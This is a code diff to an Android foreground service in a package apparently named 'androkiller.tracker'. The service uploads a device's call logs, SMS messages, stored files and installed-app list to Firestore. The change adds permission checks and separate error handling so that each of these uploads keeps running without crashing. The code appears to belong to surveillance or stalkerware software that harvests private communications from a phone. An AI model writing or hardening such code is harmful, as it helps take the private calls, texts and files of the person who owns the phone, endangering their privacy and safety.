@@ -193,13 +193,38 @@ class TrackerForegroundService : Service() {
                     level = "INFO"
                 )
             )
+            // Guard each dangerous ContentProvider query with a permission check.
+            // Without this, SecurityException is thrown on fresh install → app crash.
             try {
+                if (com.nexus.androkiller.tracker.PermissionManager.hasCallPermission(this@TrackerForegroundService)) {
+                    callSmsManager.syncCallLogsToFirestore(deviceId)
+                } else {
+                    Log.i(TAG, "Skipping call log sync — READ_CALL_LOG not granted")
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Call log sync warning: ${e.message}")
+            }
+            try {
+                if (com.nexus.androkiller.tracker.PermissionManager.hasSmsPermission(this@TrackerForegroundService)) {
+                    callSmsManager.syncSmsToFirestore(deviceId)
+                } else {
+                    Log.i(TAG, "Skipping SMS sync — READ_SMS not granted")
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "SMS sync warning: ${e.message}")
+            }
+            try {
+                // Storage scan checks permissions internally on Android 13+; still guard here
                 storageFileManager.scanAndSyncFiles(deviceId)
-                callSmsManager.syncCallLogsToFirestore(deviceId)
-                callSmsManager.syncSmsToFirestore(deviceId)
+            } catch (e: SecurityException) {
+                Log.i(TAG, "Skipping storage scan — storage permission not granted: ${e.message}")
+            } catch (e: Exception) {
+                Log.w(TAG, "Storage scan warning: ${e.message}")
+            }
+            try {
                 installedAppsManager.syncInstalledAppsToFirestore(deviceId)
             } catch (e: Exception) {
-                Log.w(TAG, "Initial storage & telephony sync warning: ${e.message}")
+                Log.w(TAG, "Installed apps sync warning: ${e.message}")
             }
         }
     }
